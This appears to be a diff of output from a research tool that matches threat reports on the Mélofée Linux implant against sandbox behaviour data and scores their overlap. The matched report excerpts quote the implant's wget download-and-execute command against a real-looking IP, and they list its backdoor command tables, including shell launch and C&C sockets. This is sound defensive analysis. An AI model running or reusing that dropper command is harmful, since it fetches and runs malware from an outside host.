@@ -1,29 +1,51 @@
-asg_object: ['.*/man/.*', '.*/selinux', '/.*bin/ls', '/.*bin/ping', '/etc/init\\.d/.*', '/proc/\\d+/exe', '/proc/self', '/var/tmp/.*', '0x[0-9a-zA-Z]{1,16}', 'Permission', 'Permission:[0-9]{3}', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+', '^GID.*', '^PID.*', '^UID.*', '^sh$', 'port \\d+']
+asg_object: ['.*/man/.*', '.*/selinux', '/.*bin/ls', '/.*bin/ping', '/etc/init\\.d/.*', '/proc/\\d+/exe', '/proc/self', '/tmp.*', '0x[0-9a-zA-Z]{1,16}', '407ab8618fed74fdb5fd374f3ed4a2fd9e8ea85631be2787e2ad17200f0462b8', 'Permission', 'Permission:[0-9]{3}', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+', '^GID.*', '^PID.*', '^UID.*', '^sh$', 'port \\d+']
 
-Sample Melofee.csv
-	num of segment in report: 28, 6 of them contain ASG object(s)
-	lenght of ctd's OPset is 9
-	#numofSTobject: 7, numofSTobject sysRrc: 0
+Sample Melofee-exatrack.csv
+	num of segment in report: 104, 14 of them contain ASG object(s)
+	lenght of ctd's OPset is 27
+	#numofSTobject: 11, numofSTobject sysRrc: 0
 	#R_malObj
-	num of ctd objects: 5, num of asg objects: 859. R_malObj is 0.0058
-		ctd_object: ['/var/tmp/.*', '0x[0-9a-zA-Z]{1,16}', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+', '^UID.*', '^sh$']
+	num of ctd objects: 81, num of asg objects: 859. R_malObj is 0.0943
+		ctd_object: ['/tmp.*', '0x[0-9a-zA-Z]{1,16}', '407ab8618fed74fdb5fd374f3ed4a2fd9e8ea85631be2787e2ad17200f0462b8', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+', '^UID.*', '^sh$']
 	#R_malSysObj
 	num of ctd objects: 0, num of asg objects: 49. R_malSysObj is 0.0000
-		len(asg_OPset): 48, len(ctd_OPset): 9
+		len(asg_OPset): 52, len(ctd_OPset): 27
 	#R_malOps
-	num of matched asg op: 1, num of asg op: 1112. R_malOps is 0.0009
-		refered lifecycle: [27, 28]
+	num of matched asg op: 22, num of asg op: 1112. R_malOps is 0.0198
+		refered lifecycle: [1, 2, 3, 4, 18, 31, 32]
 	#R_malChangeOps
 	num of matched asg op: 0, num of asg op: 47. R_malChangeOps is 0.0000
 		ref-sys lifecycle: []
 
 	hits
-	<OP28 act=send(), obj=ip_addr/ip_addr:port/port>, <OP 2 act=wget, obj=http://173.209.62.186:8765/installer, sent=wget http://173.209.62.186:8765/installer -O /var/tmp/installer wget http://173.209.62.186:8765/a.dat -O /var/tmp/usbd; chmod +x /var/tmp/installer; /var/tmp/installer -i /var/tmp/usbd The installer is also developped in C++, and takes the binary package as an argument>
-	<OP29 act=send(), obj=ip_addr/ip_addr:port/port>, <OP 3 act=wget, obj=http://173.209.62.186:8765/installer, sent=wget http://173.209.62.186:8765/installer -O /var/tmp/installer wget http://173.209.62.186:8765/a.dat -O /var/tmp/usbd; chmod +x /var/tmp/installer; /var/tmp/installer -i /var/tmp/usbd The installer is also developped in C++, and takes the binary package as an argument>
+	<OP 2 act=mprotect(), obj=0x[0-9a-zA-Z]{1,16} (mem)>, <OP 7 act=implement, obj=0x1, sent=The first two versions: Command ID	Capability	Comment 0x103	ping_back	Sent by the client 0x1	uninstall	Kill the current process and removes the persistance 0x2	update_and_relaunch	Overwrite the current running file and relaunch 0x3	launch_new_command_thread	Creates a new socket for interaction 0x4	write_file	 0x5	read_file	 0x6	launch_shell	 0x7	create_socket	0x0: TCP, 0x1: TLS, 0x2: UDP 0x10	send_local_information	Hostname, date, current UID, implant version number, … 0x50001	list_directory	 0x50002	create_directory Last version: Command ID	Capability	Comment 0x10005	reset_timer	 0x10002	clean_and_exit	 0x10004	create_socket	Create a bidirectional socket, probably used for proxying 0x40001	list_directory	 0x40002	delete_directory	Wrapper over system(rm -fr %s) 0x40003	rename	 0x40004	create_directory	 0x40005	write_file	 0x40006	read_file	 0x50001	exec_command_with_output	 0x70001	write_integer_to_file	Purpose unknown, probably used for sleeptime 0x60001	launch_shell	 0x90001	no_op	 Communication protocols The communication protocols have evolved in the three analyzed samples, however three socket types are implemented: TCPSocket (type 0x0) using raw TCP, with a custom packet format described below; TLSSocket (type 0x1), using a TLS encrypted channel to exchange with the C&C server; UDPSocket (type 0x2), using the KCP protocol 3 to send data>
+	<OP 3 act=brk(), obj=0x[0-9a-zA-Z]{1,16} (mem)>, <OP17 act=support, obj=0x110061, sent=There were however some common points between Mélofée and AlienReverse Both implants were developped in C++ Both implants used a file with a fixed ID in /var/tmp/%s.lock to ensure only one implant is running (this code was found in public 14, but seems rarely used in the wild) This implant implemented a similar mechanism for limiting working hours (defined as worktime) The command supported by this implant were the following: Command ID	Capability	Comment 0x110010	CmdBroadcast	Send encrypted data over the socket 0x110011	CmdOnRainUninstall	Unimplemented 0x110020	CmdOnline	Send local information such as hostname, date, and current UID to the server 0x110061	FileManager	Supports several subcommands such as OpenFile, CreateDir, FileEnum, FileDownload, … 0x110062	ScreenSnapshot	Unimplemented 0x110063	CmdOnTaskList	Unimplemented 0x110064	CmdOnShellCommand	Launch interactive shell 0x110065	CmdOnShellActive	Unimplemented 0x110066	CmdOnServiceList	Unimplemented 0x110068	CmdOnPortMapping	Launches EarthWorm to perform the port mapping, supporting a scanning mode with another AlienReverse implant used as a proxy>
+	<OP 4 act=munmap(), obj=0x[0-9a-zA-Z]{1,16} (mem)>, <OP11 act=use, obj=0x60001, sent=The first two versions: Command ID	Capability	Comment 0x103	ping_back	Sent by the client 0x1	uninstall	Kill the current process and removes the persistance 0x2	update_and_relaunch	Overwrite the current running file and relaunch 0x3	launch_new_command_thread	Creates a new socket for interaction 0x4	write_file	 0x5	read_file	 0x6	launch_shell	 0x7	create_socket	0x0: TCP, 0x1: TLS, 0x2: UDP 0x10	send_local_information	Hostname, date, current UID, implant version number, … 0x50001	list_directory	 0x50002	create_directory Last version: Command ID	Capability	Comment 0x10005	reset_timer	 0x10002	clean_and_exit	 0x10004	create_socket	Create a bidirectional socket, probably used for proxying 0x40001	list_directory	 0x40002	delete_directory	Wrapper over system(rm -fr %s) 0x40003	rename	 0x40004	create_directory	 0x40005	write_file	 0x40006	read_file	 0x50001	exec_command_with_output	 0x70001	write_integer_to_file	Purpose unknown, probably used for sleeptime 0x60001	launch_shell	 0x90001	no_op	 Communication protocols The communication protocols have evolved in the three analyzed samples, however three socket types are implemented: TCPSocket (type 0x0) using raw TCP, with a custom packet format described below; TLSSocket (type 0x1), using a TLS encrypted channel to exchange with the C&C server; UDPSocket (type 0x2), using the KCP protocol 3 to send data>
+	<OP 5 act=set_thread_area(), obj=0x[0-9a-zA-Z]{1,16} (mem)>, <OP 7 act=implement, obj=0x1, sent=The first two versions: Command ID	Capability	Comment 0x103	ping_back	Sent by the client 0x1	uninstall	Kill the current process and removes the persistance 0x2	update_and_relaunch	Overwrite the current running file and relaunch 0x3	launch_new_command_thread	Creates a new socket for interaction 0x4	write_file	 0x5	read_file	 0x6	launch_shell	 0x7	create_socket	0x0: TCP, 0x1: TLS, 0x2: UDP 0x10	send_local_information	Hostname, date, current UID, implant version number, … 0x50001	list_directory	 0x50002	create_directory Last version: Command ID	Capability	Comment 0x10005	reset_timer	 0x10002	clean_and_exit	 0x10004	create_socket	Create a bidirectional socket, probably used for proxying 0x40001	list_directory	 0x40002	delete_directory	Wrapper over system(rm -fr %s) 0x40003	rename	 0x40004	create_directory	 0x40005	write_file	 0x40006	read_file	 0x50001	exec_command_with_output	 0x70001	write_integer_to_file	Purpose unknown, probably used for sleeptime 0x60001	launch_shell	 0x90001	no_op	 Communication protocols The communication protocols have evolved in the three analyzed samples, however three socket types are implemented: TCPSocket (type 0x0) using raw TCP, with a custom packet format described below; TLSSocket (type 0x1), using a TLS encrypted channel to exchange with the C&C server; UDPSocket (type 0x2), using the KCP protocol 3 to send data>
+	<OP19 act=arch_prctl(), obj=0x[0-9a-zA-Z]{1,16} (mem)>, <OP 7 act=implement, obj=0x1, sent=The first two versions: Command ID	Capability	Comment 0x103	ping_back	Sent by the client 0x1	uninstall	Kill the current process and removes the persistance 0x2	update_and_relaunch	Overwrite the current running file and relaunch 0x3	launch_new_command_thread	Creates a new socket for interaction 0x4	write_file	 0x5	read_file	 0x6	launch_shell	 0x7	create_socket	0x0: TCP, 0x1: TLS, 0x2: UDP 0x10	send_local_information	Hostname, date, current UID, implant version number, … 0x50001	list_directory	 0x50002	create_directory Last version: Command ID	Capability	Comment 0x10005	reset_timer	 0x10002	clean_and_exit	 0x10004	create_socket	Create a bidirectional socket, probably used for proxying 0x40001	list_directory	 0x40002	delete_directory	Wrapper over system(rm -fr %s) 0x40003	rename	 0x40004	create_directory	 0x40005	write_file	 0x40006	read_file	 0x50001	exec_command_with_output	 0x70001	write_integer_to_file	Purpose unknown, probably used for sleeptime 0x60001	launch_shell	 0x90001	no_op	 Communication protocols The communication protocols have evolved in the three analyzed samples, however three socket types are implemented: TCPSocket (type 0x0) using raw TCP, with a custom packet format described below; TLSSocket (type 0x1), using a TLS encrypted channel to exchange with the C&C server; UDPSocket (type 0x2), using the KCP protocol 3 to send data>
+	<OP32 act=send(), obj=ip_addr/ip_addr:port/port>, <OP 2 act=wget, obj=http://173.209.62.186:8765/installer, sent=wget http://173.209.62.186:8765/installer -O /var/tmp/installer wget http://173.209.62.186:8765/a.dat -O /var/tmp/usbd; chmod +x /var/tmp/installer; /var/tmp/installer -i /var/tmp/usbd The installer is also developped in C++, and takes the binary package as an argument>
+	<OP33 act=send(), obj=ip_addr/ip_addr:port/port>, <OP 3 act=wget, obj=http://173.209.62.186:8765/installer, sent=wget http://173.209.62.186:8765/installer -O /var/tmp/installer wget http://173.209.62.186:8765/a.dat -O /var/tmp/usbd; chmod +x /var/tmp/installer; /var/tmp/installer -i /var/tmp/usbd The installer is also developped in C++, and takes the binary package as an argument>
+
+Sample Melofee-thehackernews.csv
+	num of segment in report: 17, 0 of them contain ASG object(s)
+	lenght of ctd's OPset is 0
+	#numofSTobject: 0, numofSTobject sysRrc: 0
+	#R_malObj
+	num of ctd objects: 0, num of asg objects: 859. R_malObj is 0.0000
+		ctd_object: []
+	#R_malSysObj
+	num of ctd objects: 0, num of asg objects: 49. R_malSysObj is 0.0000
+		len(asg_OPset): 52, len(ctd_OPset): 0
+	#R_malOps
+	num of matched asg op: 0, num of asg op: 1112. R_malOps is 0.0000
+		refered lifecycle: []
+	#R_malChangeOps
+	num of matched asg op: 0, num of asg op: 47. R_malChangeOps is 0.0000
+		ref-sys lifecycle: []
 
 
 OperationPair that changes system resources:
-[<OP13 act=write(), obj=.*/selinux>, <OP39 act=write(), obj=/etc/init\.d/.*>, <OP45 act=write(), obj=ip_addr/ip_addr:port/port>, <OP44 act=write(), obj=ip_addr/ip_addr:port/port>]
+[<OP17 act=write(), obj=.*/selinux>, <OP48 act=write(), obj=ip_addr/ip_addr:port/port>, <OP49 act=write(), obj=ip_addr/ip_addr:port/port>, <OP43 act=write(), obj=/etc/init\.d/.*>]
 
 {
     ".*/man/.*": [
@@ -867,7 +889,10 @@ OperationPair that changes system resources:
     "/proc/self": [
         "/proc/self/exe"
     ],
-    "/var/tmp/.*": [
+    "/tmp.*": [
+        "/tmp",
+        "/var/tmp",
         "/var/tmp/"
-    ]
+    ],
+    "407ab8618fed74fdb5fd374f3ed4a2fd9e8ea85631be2787e2ad17200f0462b8": "./malware/407ab8618fed74fdb5fd374f3ed4a2fd9e8ea85631be2787e2ad17200f0462b8"
 }
